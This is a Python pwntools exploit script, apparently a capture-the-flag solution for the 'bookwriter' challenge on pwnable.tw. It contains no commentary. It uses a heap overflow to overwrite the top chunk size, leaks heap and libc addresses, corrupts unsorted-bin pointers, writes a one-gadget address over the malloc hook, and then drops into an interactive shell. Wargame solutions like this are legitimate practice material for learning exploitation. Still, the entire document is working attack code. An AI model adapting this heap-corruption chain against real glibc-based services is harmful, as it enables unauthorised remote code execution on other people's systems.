from pwn import *
#io = process('./bookwriter')
io = remote('127.0.0.1', 4000)
#io = remote('chall.pwnable.tw', 10304)

def add(size, content):
    io.recvuntil(' :')
    io.sendline('1')
    io.recvuntil(' :')
    io.sendline(str(size))
    io.recvuntil(' :')
    io.send(content)

def view(index):
    io.recvuntil(' :')
    io.sendline('2')
    io.recvuntil(' :')
    io.sendline(str(index))

def edit(index, content):
    io.recvuntil(' :')
    io.sendline('3')
    io.recvuntil(' :')
    io.sendline(str(index))
    io.recvuntil(':')
    io.send(content)

def info():
    io.recvuntil(' :')
    io.sendline('4')

def name(name):
    io.recvuntil(' :')
    io.send(name)

name('n'*0x3f+'m')
info()
io.recvuntil(') ')
io.sendline('0')

add(0x8, 'a'*8)

info()
#io.interactive()
io.recvuntil('nm')
heap = u64(io.recvline()[:-1].ljust(8, '\x00')) - 0x1020
print(hex(heap))
io.recvuntil(') ')
io.sendline('0')

#io.interactive()
for i in range(1, 8):
    add(0x98, str(i)*8)

edit(0, '\x00')
add(0x98, '8'*8)
#io.interactive()
edit(0, '\x00' + 'A'*0x517 + p64(0xad1))
#io.interactive()
add(0x1000, 'z'*8)

#io.interactive()
edit(0, 'B'*0x527 + 'b')
#io.interactive()
view(1)
#io.interactive()
io.recvuntil('Bb')
libc = u64(io.recvline()[:-1].ljust(8, '\x00')) - 0x3c3b78
print(hex(libc))
#io.interactive()
edit(0, '\x00' + 'C'*0x517 + p64(0xad1) + p64(libc+0x3c3b78) + '\x60\x20\x60\x00\x00\x00')

info()
io.recvuntil('0) ')
io.sendline('1')
#io.interactive()
name('N'*8 + p64(0x201) + p64(heap + 0x1530) + p64(libc + 0x3c3b78))
#raw_input()
add(0x1f8, 'X'*0x30 + p64(libc + 0x3c3b10) + p64(0) + p64(0) + p64(0))
edit(0, p64(libc + 0xf0567))

#raw_input()
#io.interactive()
io.sendline('1')
io.sendline('1')
io.interactive()

